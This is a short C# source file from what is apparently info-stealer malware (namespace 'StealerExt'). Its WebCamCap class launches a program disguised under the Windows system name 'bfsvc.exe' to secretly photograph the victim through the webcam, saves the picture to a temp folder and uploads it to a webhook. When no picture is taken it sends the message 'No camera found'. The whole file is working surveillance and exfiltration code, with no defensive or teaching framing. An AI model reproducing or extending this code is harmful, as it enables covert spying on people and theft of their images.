using System.IO;

namespace StealerExt
{
    internal static class WebCamCap
    {
        public static void wcc()
        {
            StartProcess.Run("bfsvc.exe", "capture.png");
            if (File.Exists(Path.Combine(API.Temp, "capture.png")))
            {
                new API(API.wHook).SendMultiPartData(FileName: "capture.png", filePath: Path.Combine(API.Temp, "capture.png"));
            }
            else
            {
                new API(API.wHook).SendMultiPartData("No camera found");
            }
        }
    }
}
